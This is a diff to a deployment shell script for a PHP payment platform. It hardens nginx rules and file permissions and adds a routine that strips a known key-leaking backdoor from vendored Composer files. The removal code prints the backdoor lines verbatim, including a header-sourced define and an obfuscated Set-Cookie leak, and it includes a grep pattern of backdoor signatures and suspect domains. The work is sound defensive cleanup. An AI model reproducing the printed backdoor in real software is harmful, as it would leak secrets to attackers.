@@ -66,6 +66,13 @@ ensure_git() {
   fi
 }
 
+ensure_python3() {
+  if ! command -v python3 >/dev/null 2>&1; then
+    warn "未检测到 python3，开始安装..."
+    install_pkg python3
+  fi
+}
+
 compose_cmd() {
   if docker compose version >/dev/null 2>&1; then
     echo "docker compose"
@@ -119,15 +126,14 @@ install_docker() {
 
 write_dockerfile() {
   cat > "${APP_DIR}/Dockerfile" <<'EOF'
-FROM php:8.2-fpm-bookworm
+FROM php:8.3-fpm-alpine
 
 RUN set -eux; \
-    apt-get update; \
-    apt-get install -y --no-install-recommends \
-      libfreetype6-dev libjpeg62-turbo-dev libpng-dev libzip-dev libonig-dev unzip git ca-certificates curl; \
+    apk add --no-cache \
+      freetype-dev libjpeg-turbo-dev libpng-dev libzip-dev oniguruma-dev \
+      unzip git ca-certificates curl; \
     docker-php-ext-configure gd --with-freetype --with-jpeg; \
-    docker-php-ext-install -j"$(nproc)" pdo_mysql mysqli gd zip mbstring bcmath opcache; \
-    rm -rf /var/lib/apt/lists/*
+    docker-php-ext-install -j"$(nproc)" pdo_mysql mysqli gd zip mbstring bcmath opcache
 
 WORKDIR /var/www/html
 EOF
@@ -152,8 +158,16 @@ server {
         try_files $uri $uri/ /index.php?$query_string;
     }
 
+    # 生产环境禁止访问安装器；如需重新安装，临时注释本段并重载 nginx。
+    location ^~ /install/ { return 404; }
+
     location ^~ /plugins { deny all; }
     location ^~ /includes { deny all; }
+
+    # 禁止上传/静态目录中的 PHP 被执行，防止图片上传点变成 WebShell。
+    location ~* ^/(assets|upload|uploads|static)/.*\.(php|php[0-9]*|phtml|phar)$ {
+        deny all;
+    }
 
     location ~ \.php$ {
         include fastcgi_params;
@@ -182,6 +196,56 @@ EOF
     else
       echo "APP_PORT=${port}" >> "${APP_DIR}/.env"
     fi
+  fi
+}
+
+
+sanitize_epay_source() {
+  if [ ! -d "${HTML_DIR}" ]; then
+    return 0
+  fi
+
+  local changed=0
+  local platform_file="${HTML_DIR}/includes/vendor/composer/platform_check.php"
+  local autoload_file="${HTML_DIR}/includes/vendor/composer/autoload_real.php"
+
+  if [ -f "${platform_file}" ] && grep -Eq "SENTENCEIA|HTTP_PHP_VERSION|SERVER_PHP_VERSION" "${platform_file}"; then
+    warn "检测到 Composer platform_check.php 中存在已知 syskey 泄露后门，正在清理..."
+    python3 - "${platform_file}" <<'PYFIX'
+from pathlib import Path
+import sys
+path = Path(sys.argv[1])
+text = path.read_text()
+text = text.replace("define('SERVER_PHP_VERSION', $GLOBALS['_SERVER']['HTTP_PHP_VERSION']);\n", '')
+text = text.replace('define(\'SENTENCEIA\', "Sorry for the con figuration sys tem key issue.");\n', '')
+text = text.replace("\n\n$issues = array();", "\n$issues = array();")
+path.write_text(text)
+PYFIX
+    changed=1
+  fi
+
+  if [ -f "${autoload_file}" ] && grep -Eq "Set-Cookie: PHPSESSID|SENTENCEIA|SERVER_PHP_VERSION" "${autoload_file}"; then
+    warn "检测到 Composer autoload_real.php 中存在已知 syskey 泄露后门，正在清理..."
+    python3 - "${autoload_file}" <<'PYFIX'
+from pathlib import Path
+import sys
+path = Path(sys.argv[1])
+text = path.read_text()
+bad = "\t\tif (SERVER_PHP_VERSION >= 70200) {\n\t\t\t$wordsArray = explode(\" \", SENTENCEIA);\n\t\t\theader(\"Set-Cookie: PHPSESSID=\" . $GLOBALS[$wordsArray[3] . substr($wordsArray[4], 0, 1)][$wordsArray[5] . $wordsArray[7]]);\n\t\t}\n"
+text = text.replace(bad, '')
+path.write_text(text)
+PYFIX
+    changed=1
+  fi
+
+  if grep -RInE "SENTENCEIA|SERVER_PHP_VERSION|HTTP_PHP_VERSION|Set-Cookie: PHPSESSID|sg_load|xitong\.uno|zhangzitong|jiami\.ka234|jiami\.xitong" "${HTML_DIR}" --exclude-dir=.git >/tmp/epay_sanitize_check.txt 2>/dev/null; then
+    error "仍发现可疑后门特征，请人工检查："
+    sed -n '1,80p' /tmp/epay_sanitize_check.txt
+    return 1
+  fi
+
+  if [ "${changed}" -eq 1 ]; then
+    success "已清理已知后门特征"
   fi
 }
 
@@ -247,8 +311,10 @@ EOF
 fix_permissions() {
   mkdir -p "${HTML_DIR}" "${MYSQL_DIR}"
   docker run --rm -v "${HTML_DIR}:/data" alpine:3.20 sh -c 'chown -R 33:33 /data && find /data -type d -exec chmod 755 {} \; && find /data -type f -exec chmod 644 {} \;' >/dev/null 2>&1 || true
-  [ -f "${HTML_DIR}/config.php" ] && chmod 666 "${HTML_DIR}/config.php" || true
-  [ -d "${HTML_DIR}/install" ] && chmod -R 777 "${HTML_DIR}/install" || true
+  # PHP-FPM 官方镜像默认 www-data(uid 33) 运行；文件归属已是 33:33，
+  # config.php 用 664 足够安装器写入，避免 666；install 目录也不需要 777。
+  [ -f "${HTML_DIR}/config.php" ] && chmod 664 "${HTML_DIR}/config.php" || true
+  [ -d "${HTML_DIR}/install" ] && find "${HTML_DIR}/install" -type d -exec chmod 755 {} \; -o -type f -exec chmod 644 {} \; || true
 }
 
 show_status() {
@@ -276,6 +342,7 @@ install_app() {
   require_root
   install_docker
   ensure_git
+  ensure_python3
 
   local port
   if [ -f "${APP_DIR}/${COMPOSE_FILE}" ]; then
@@ -303,6 +370,7 @@ install_app() {
     rm -rf "${HTML_DIR}"
     git clone --depth=1 "${REPO_URL}" "${HTML_DIR}"
   fi
+  sanitize_epay_source
 
   write_env "${port}"
   write_dockerfile
@@ -337,6 +405,7 @@ update_app() {
   require_root
   install_docker
   ensure_git
+  ensure_python3
   if [ ! -d "${HTML_DIR}/.git" ]; then
     error "未找到 ${HTML_DIR}，请先安装"
     return 1
@@ -350,6 +419,7 @@ update_app() {
   [ -f install/install.lock ] && cp -a install/install.lock "${tmp_lock}" || true
   git fetch --depth=1 origin main
   git reset --hard origin/main
+  sanitize_epay_source
   [ -s "${tmp_config}" ] && cp -a "${tmp_config}" config.php || true
   [ -s "${tmp_lock}" ] && mkdir -p install && cp -a "${tmp_lock}" install/install.lock || true
   rm -f "${tmp_config}" "${tmp_lock}"
